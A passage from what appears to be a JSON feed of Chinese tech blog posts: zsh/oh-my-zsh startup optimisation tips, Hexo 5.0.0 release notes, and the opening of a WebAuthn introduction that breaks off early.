的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full 